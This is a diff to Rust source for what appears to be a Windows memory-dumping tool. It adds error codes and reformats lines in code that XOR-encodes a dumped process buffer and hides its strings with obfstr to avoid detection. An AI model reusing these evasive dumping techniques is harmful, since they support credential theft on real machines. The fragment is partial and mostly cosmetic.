@@ -10,7 +10,9 @@ use std::iter::once;
 use std::mem::size_of;
 use std::os::windows::ffi::OsStrExt;
 use std::ptr;
-use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE, S_FALSE, S_OK};
+use windows_sys::Win32::Foundation::{
+    CloseHandle, GetLastError, INVALID_HANDLE_VALUE, S_FALSE, S_OK,
+};
 use windows_sys::Win32::Storage::FileSystem::{
     CreateFileW, WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
 };
@@ -104,7 +106,10 @@ fn main() {
                 &callback_info,
             ) == 1
             {
-                let data = std::slice::from_raw_parts_mut(buf as *mut u8, HeapSize(GetProcessHeap(), 0 as _, buf));
+                let data = std::slice::from_raw_parts_mut(
+                    buf as *mut u8,
+                    HeapSize(GetProcessHeap(), 0 as _, buf),
+                );
 
                 trace!("{}", obfstr!("xor the payload"));
                 let mut data2 = xor_encode(&data.to_vec(), 0x01);
@@ -125,7 +130,7 @@ fn main() {
                     error!("Fail to WriteFile");
                 }
             } else {
-                error!("{}", obfstr!("Error while dumping"));
+                error!("{}: {}", obfstr!("Error while dumping"), GetLastError());
             }
         } else {
             trace!("{}", obfstr!("Dumping without callback"));
